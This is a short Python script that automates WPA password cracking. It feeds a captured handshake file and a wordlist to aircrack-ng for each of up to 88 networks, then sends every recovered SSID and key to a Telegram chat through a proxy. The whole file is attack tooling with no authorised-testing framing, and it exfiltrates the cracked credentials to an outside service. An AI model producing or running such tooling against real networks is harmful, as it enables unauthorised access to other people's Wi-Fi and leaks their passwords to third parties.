import telegram, re, time
from subprocess import Popen, PIPE, STDOUT

TELEGRAM_TOKEN = "TGTOKEN"
TELEGRAM_CHAT_ID = -1
#Telegram SOCKS5 PROXY

ssidlist = []
def TelegramSend(out_string):
    try:
        pp = telegram.utils.request.Request(proxy_url="proxy_url",urllib3_proxy_kwargs={'username': 'username','password': 'password'})
        bot = telegram.Bot(token=TELEGRAM_TOKEN,request=pp)
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=out_string)
    except:
        print("Can't send Telegram alert, check your internet connection & proxy")

def GetSSID(firsttime,ssid):
    global ssidlist
    if firsttime == True:
        buflist = []
        p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
        firstoutput = p.communicate()[0]
        for line in firstoutput.decode().splitlines():
            buflist.append(list(filter(None,[s.replace(' ', '') for s in line.split("  ")])))
        for item in buflist:
            if  (len(item)) == 4:
                ssidlist.append(item)  
    else:
        for item in ssidlist:
            if item[0] == str(ssid):
                return item[2]    

GetSSID(True,"")

for i in range (1,89):
    byteinput = str.encode(str(i))
    print("Working with ["+str(i)+"] "+GetSSID(False,i)+".. ")
    p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
    grep_stdout = p.communicate(input=byteinput)[0]
    outputlines = grep_stdout.decode()
    for line in outputlines.splitlines():
        localessid =  GetSSID(False,i);

        if "KEY FOUND!" in line:
            s = line[line.find('KEY FOUND!'):]
            localekey = s[s.find("[")+len("["):s.rfind("]")].replace(" ","")
            TelegramSend("[KEY FOUND]\nSSID: "+localessid+"\nKEY: \""+localekey+"\"")
            print("[RESULT FOR "+localessid+"] -> KEY FOUND:"+" \'"+localekey+"\"")

        elif ("KEY NOT FOUND") in line:
            print("[RESULT FOR "+localessid+"] -> KEY NOT FOUND")
            TelegramSend("[KEY NOT FOUND]\nSSID: "+localessid)